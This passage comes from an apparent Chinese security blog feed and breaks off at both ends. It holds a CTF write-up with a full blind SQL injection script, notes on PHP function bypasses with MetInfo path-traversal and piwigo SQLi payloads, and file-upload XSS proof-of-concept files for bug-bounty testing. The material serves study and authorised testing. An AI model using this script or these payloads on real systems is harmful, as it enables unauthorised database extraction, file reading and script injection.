login(username)</span><br><span class="line">    token = token_fix(token)</span><br><span class="line">    res = home(token)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_length</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>): </span><br><span class="line">        username = <span class="string">&quot;admin&#x27;and length(database()) = &#123;&#125;#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        username = username.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">        res = request(username)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;No user found&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;database_length: &#x27;</span>,i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_name</span>(<span class="params">length</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> str1:</span><br><span class="line">            payload = <span class="string">&quot;admin&#x27;and substr(database(),&#123;&#125;,1) = &#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(idx,char)</span><br><span class="line">            payload = payload.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">            res = request(payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;No user found&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">                name += char</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">     </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_length</span>():</span><br><span class="line">    cnt = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>): </span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            payload = <span class="string">&quot;admin&#x27;and length((select table_name from information_schema.tables where table_schema=&#x27;dkctf&#x27; limit &#123;&#125;,1))=&#123;&#125;#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            payload = payload.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">            res = request(payload)</span><br><span class="line">            <span class="comment">#print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;No user found&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;table_length: &#x27;</span>,i,j)</span><br><span class="line">                cnt[i]=j</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> cnt</span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_name</span>(<span class="params">cnt</span>):</span><br><span class="line">    tables=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cnt)):</span><br><span class="line">        table = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,cnt[i]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> str1:</span><br><span class="line">                payload = <span class="string">&quot;admin&#x27;and substr((select table_name from information_schema.tables where table_schema=&#x27;dkctf&#x27; limit &#123;&#125;,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(i,j,char)</span><br><span class="line">                payload = payload.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">                res = request(payload)</span><br><span class="line">                <span class="comment">#print(res)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;No user found&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">                    table += char</span><br><span class="line">                    <span class="built_in">print</span>(i,table)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        tables[i]=table</span><br><span class="line">    <span class="keyword">return</span> tables</span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_length</span>():</span><br><span class="line">    cnt = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>): </span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            payload = <span class="string">&quot;admin&#x27;and length((select column_name from information_schema.columns where table_schema=&#x27;dkctf&#x27; and table_name=&#x27;secret&#x27; limit &#123;&#125;,1))=&#123;&#125;#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            payload = payload.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">            res = request(payload)</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;No user found&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;column_length: &#x27;</span>,i,j)</span><br><span class="line">                cnt[i]=j</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> cnt</span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>(<span class="params">cnt</span>):</span><br><span class="line">    columns=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cnt)):</span><br><span class="line">        column = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,cnt[i]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> str1:</span><br><span class="line">                payload = <span class="string">&quot;admin&#x27;and substr((select column_name from information_schema.columns where table_schema=&#x27;dkctf&#x27; and table_name=&#x27;secret&#x27; limit &#123;&#125;,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(i,j,char)</span><br><span class="line">                payload = payload.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">                res = request(payload)</span><br><span class="line">                <span class="comment">#print(res)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;No user found&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">                    column += char</span><br><span class="line">                    <span class="built_in">print</span>(i,column)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        columns[i]=column</span><br><span class="line">    <span class="keyword">return</span> columns</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> str1:</span><br><span class="line">            payload = <span class="string">&quot;admin&#x27;and ord(substr((select sseeccrreett from secret),&#123;&#125;,1))=&#123;&#125;#&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(char))</span><br><span class="line">            payload = payload.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">            res = request(payload)</span><br><span class="line">            <span class="comment">#print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;No user found&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">                flag += char</span><br><span class="line">                <span class="built_in">print</span>(i,flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 注库名 dkctf</span></span><br><span class="line">     length = database_length() <span class="comment"># 5</span></span><br><span class="line">     database_name(length) <span class="comment"># dkctf</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 注表名 user secret</span></span><br><span class="line">    <span class="comment"># table_length = table_length() # &#123;0: 4, 1: 6&#125;</span></span><br><span class="line">    <span class="comment"># print(table_length)</span></span><br><span class="line">    <span class="comment"># tables = table_name(table_length) # &#123;0: &#x27;user&#x27;, 1: &#x27;secret&#x27;&#125;</span></span><br><span class="line">    <span class="comment"># print(tables)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 注列名 注的是 secret 表 &#123;0: &#x27;flag&#x27;, 1: &#x27;sseeccrreett&#x27;&#125;</span></span><br><span class="line">    <span class="comment"># column_length = column_length()</span></span><br><span class="line">    <span class="comment"># column_length = &#123;0: 4, 1: 12&#125;</span></span><br><span class="line">    <span class="comment"># print(column_length)</span></span><br><span class="line">    <span class="comment"># columns = column_name(column_length)</span></span><br><span class="line">    <span class="comment"># print(columns) # &#123;0: &#x27;flag&#x27;, 1: &#x27;sseeccrreett&#x27;&#125;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 注数据 注 secret 表 sseeccrreett 列 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240606110151197.png" alt="image-20240606110151197"></p><p>最后爆出flag</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240606110547516.png" alt="image-20240606110547516"></p><p>这个盲注脚本应该是我看到过最全的了，应该可以通用，直接就是一手保存</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-PHP特性</title>
      <link href="/post/94af272a.html"/>
      <url>/post/94af272a.html</url>
      
        <content type="html"><![CDATA[<h2 id="PHP缺陷函数"><a href="#PHP缺陷函数" class="headerlink" title="PHP缺陷函数"></a>PHP缺陷函数</h2><h3 id="强等于与弱等于"><a href="#强等于与弱等于" class="headerlink" title="强等于与弱等于"></a>强等于与弱等于</h3><p>在PHP中，<code>=</code>代表赋值，<code>==</code>代表弱等于，<code>===</code>代表强等于，强等于和弱等于区别就在于是否比较类型</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">===:比较的不仅仅是值相等，而且类型也必须相等，只有当值和类型都相等的时候，才会返回ture</span><br><span class="line">例如 <span class="title function_ invoke__">var_dump</span>(<span class="number">1</span>===<span class="string">&quot;1&quot;</span>);返回的是<span class="literal">false</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605114211356.png" alt="image-20240605114211356"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">==:弱比较只要求比较两个值在转化类型之后相等即可，如果两个值的类型不同，会尝试将其中一个值转化为另一个值的类型</span><br><span class="line">例如 <span class="title function_ invoke__">var_dump</span>(<span class="number">1</span>==<span class="string">&quot;1&quot;</span>);返回的是<span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605114412890.png" alt="image-20240605114412890"></p><p>综上，php比较运算符<code>===</code>在进行比较时，会先比较两种字符串的类型是否相等，再比较值是否相等，一般md5弱等于比较常考</p><p>具体例子可以参考这一篇：<a href="https://blog.csdn.net/csjjjd/article/details/135005124">PHP强相等&amp;弱相等（附带科学计数法）_php 科学计数法-CSDN博客</a></p><h3 id="intval函数"><a href="#intval函数" class="headerlink" title="intval函数"></a>intval函数</h3><p><code>intval()</code>函数可以获取变量的整数值，常用于强制类型转换，常见语法<code>int intval($var,$base)</code>，其中<code>$var</code>为需要转化的变量，<code>$base</code>为转换所需要的进制，当base为空时，默认值为0，会根据<code>$var</code>的格式来调整转化进制，如果<code>$var</code>以0开头，就使用8进制，如果<code>$var</code>以0x开头，就使用16进制，否则使用10进制</p><p>当<code>intval()</code>遇上数组的时候，不关系数组的内容，只判断数组内有没有元素，如果是空数组就返回0，如果是非空数组就返回1，但是当传入的<code>$var</code>是数组中的某个值时，则当作变量来进行转换，而不是当作数组类型</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">8</span>,<span class="number">6</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$arr</span>[<span class="number">0</span>]));</span><br><span class="line">返回的是 <span class="keyword">int</span>(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>当进行字符串转化时，会先判断字符串是否已数字开头，如果以数字开头，就会返回1个或多个连续的数字，如果以字母开头，就返回0</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;12abc&#x27;</span>));     <span class="keyword">int</span>(<span class="number">12</span>)</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&quot;12abc&quot;</span>));     <span class="keyword">int</span>(<span class="number">12</span>)</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;abc123&#x27;</span>));    <span class="keyword">int</span>(<span class="number">0</span>)</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1a2b3c&#x27;</span>));    <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;0101&#x27;</span>));      <span class="keyword">int</span>(<span class="number">101</span>)</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&quot;0x2b&quot;</span>));      <span class="keyword">int</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>另外，<code>intval()</code>支持算术运算，即<code>intval(5*5)</code>会返回25</p><h3 id="strpos函数"><a href="#strpos函数" class="headerlink" title="strpos函数"></a>strpos函数</h3><p><code>strpos</code>函数用于查找一个字符串在另一个字符串中首次出现的位置（区分大小写），如果找到了匹配的字符串，<code>strpos</code>函数就会返回匹配的第一个字符的索引值，否则就返回false</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str1</span> = <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;world&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 查找 $str2 在 $str1 中首次出现的位置</span></span><br><span class="line"><span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$str1</span>, <span class="variable">$str2</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;找到了 <span class="subst">$str2</span>，它在 <span class="subst">$str1</span> 中的位置是 <span class="subst">$pos</span>&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$str2</span> 不在 <span class="subst">$str1</span> 中&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605132739685.png" alt="image-20240605132739685"></p><p>当我们使用<code>strpos</code>函数的时候，如果被匹配字符串开头就是我们要匹配的目标字符串，那么strpos就会返回0，此时如果采用弱比较，那么<code>0==false</code>返回的是true，那么就会和没找到相关字符串情况相同，这个时候我们就可以成功绕过strpos函数</p><p>同时，如果加上换行符%0a时，strpos是检测不出来的，这也是这种函数的一种绕过思路</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605134026638.png" alt="image-20240605134026638"></p><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array"></a>in_array</h3><p>在PHP中，可以使用<code>in_array()</code>函数直接确定某元素是否在数组中，如果数组中存在该元素，则会返回true，如果不存在，则返回false</p><p>语法<code>in_array(search,array,type)</code></p><p>当type设置为strict时，就会判断类型，和强等于一致，但是如果不设置type，就不会判断类型，和弱等于一样，故其绕过方式可以参考强等于和弱等于</p><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h3><p><code>preg_match</code>是检查是否匹配的函数，经常用在正则表达式的匹配中，其语法为<code>preg_match($pattern,$subject,$matches,$flags,$offset)</code>，前两个参数是必须的，后三个参数不填写的话会有自己的默认值</p><p>通常<code>preg_match</code>有以下几种方式绕过</p><p><strong>数组绕过</strong></p><p>由于<code>preg_match</code>只能处理字符串，如果不按规定传入一个字符串，通常传入一个数组进去，就会使<code>preg_match</code>失效，从而进行绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;flag.php&#x27;</span>; <span class="comment">//目标是输入flag.php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$a</span>)==<span class="literal">false</span>)&#123; <span class="comment">//如果匹配中出现了flag</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;这样子是不行的~&#x27;</span>); <span class="comment">//绕过失败，输出：这样子是不行的~</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;成功啦~&#x27;</span>; <span class="comment">//绕过成功</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时我们通常有三种绕过数组形式，如下所示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>[] = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = [<span class="string">&#x27;flag.php&#x27;</span>];</span><br></pre></td></tr></table></figure><h3 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace"></a>str_replace</h3><p><code>str_replace</code>函数的作用是替换字符串中的一些字符（区分大小写），其缺陷在于无法迭代过滤，只过滤一次，所以我们通常通过双写进行绕过</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605174943563.png" alt="image-20240605174943563"></p><p>接下来进行双写flag进行绕过，将<code>$a</code>改成<code>flflagag.php</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605175053228.png" alt="image-20240605175053228"></p><p>成功绕过，同时，由于<code>preg_replace</code>对大小写不敏感，所以我们也可以大写绕过</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605175158065.png" alt="image-20240605175158065"></p><h2 id="CMS实例"><a href="#CMS实例" class="headerlink" title="CMS实例"></a>CMS实例</h2><h3 id="MetInfo-任意文件读取"><a href="#MetInfo-任意文件读取" class="headerlink" title="MetInfo 任意文件读取"></a>MetInfo 任意文件读取</h3><p> 考点：<code>str_replace</code>无法迭代过滤</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/f8ac8250bcfee65b8af089e9b59a37bc.png" alt="f8ac8250bcfee65b8af089e9b59a37bc"></p><p>通过实现<code>../和./</code>的过滤，防止用户实现路径穿越，由于<code>$dir</code>是可控的，我们可以通过绕过<code>str_replace</code>来实现任意文件读取，故对应的payload为<code>../http\..\config\config_db.php</code>，可以读到数据库配置文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605180223578.png" alt="image-20240605180223578"></p><h3 id="piwigo-SQL注入"><a href="#piwigo-SQL注入" class="headerlink" title="piwigo SQL注入"></a>piwigo SQL注入</h3><p>考点：使用<code>in_array</code>函数但未使用第三个参数，导致过滤不严，造成代码的注入，进而引起sql注入</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/ff97380da602a8dd3bbf5d8c1e1cfc86.png" alt="ff97380da602a8dd3bbf5d8c1e1cfc86"></p><p>故payload为<code>1,1 and if(ascii(substr((select database(),1,1))=112,1,sleep(3)));</code></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传src漏洞</title>
      <link href="/post/42259b6.html"/>
      <url>/post/42259b6.html</url>
      
        <content type="html"><![CDATA[<h2 id="构造数据包"><a href="#构造数据包" class="headerlink" title="构造数据包"></a>构造数据包</h2><p>首先讲请求改成POST，请求体中一定要有参数，例如<code>upfile=123456</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/38c2d419f88d91daec4f6829cb73a8ab.png" alt="38c2d419f88d91daec4f6829cb73a8ab"></p><p>右击选择改成表单模式：<code>change body encoding</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/7a8e9ba8aa7c720586161281a46f1e90.png" alt="7a8e9ba8aa7c720586161281a46f1e90"></p><p>就会变成下面的格式</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240529221217563.png" alt="image-20240529221217563"></p><p>然后再添加文件参数名，在upfile后加入文件名：<code>;filename=&quot;微信图片_20240220223517.png&quot;</code>，此时就构造好了一个数据包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240530082709021.png" alt="image-20240530082709021"></p><h2 id="文件上传导致XSS的POC"><a href="#文件上传导致XSS的POC" class="headerlink" title="文件上传导致XSS的POC"></a>文件上传导致XSS的POC</h2><h3 id="xss-svg和xss-xml"><a href="#xss-svg和xss-xml" class="headerlink" title="xss.svg和xss.xml"></a>xss.svg和xss.xml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> <span class="string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">baseProfile</span>=<span class="string">&quot;full&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">alert</span>(<span class="string">&quot;SVG XSS&quot;</span>);<span class="comment">//跳转或者控制台打印；//控制台打印时将alert（）替换为console.log()</span></span></span><br><span class="line"><span class="language-javascript">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> <span class="string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">baseProfile</span>=<span class="string">&quot;full&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">polygon</span> <span class="attr">id</span>=<span class="string">&quot;triangle&quot;</span> <span class="attr">points</span>=<span class="string">&quot;0,0 0,50 50,0&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#009900&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;#004400&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="number">1</span>); 或者<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line">如果遇到waf</span><br><span class="line">poc加到图片里面就行</span><br></pre></td></tr></table></figure><p>以上两个是造成弹窗的POC，但是在实战中，为了不让自己进去，我们尽量传跳转的POC，也就是下面的POC</p><p>test.svg</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;svg version=<span class="string">&quot;1.1&quot;</span> baseProfile=<span class="string">&quot;full&quot;</span> xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> </span><br><span class="line">xmlns:xlink=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span><br><span class="line"> &lt;a xlink:href=<span class="string">&quot;https://baidu.com&quot;</span>&gt;</span><br><span class="line"> &lt;rect width=<span class="string">&quot;300&quot;</span> height=<span class="string">&quot;100&quot;</span> style=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span><br><span class="line"> &lt;/a&gt;</span><br><span class="line"> &lt;/svg&gt;</span><br></pre></td></tr></table></figure><p>test.xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">baseProfile</span>=<span class="string">&quot;full&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">&quot;https://baidu.com&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="xss-html"><a href="#xss-html" class="headerlink" title="xss.html"></a>xss.html</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&quot;&gt;&lt;svg/onload=console.log(1)&gt;</span><br><span class="line">改成跳转了，不要传弹xss的poc了，除非是众测或者大厂src</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span 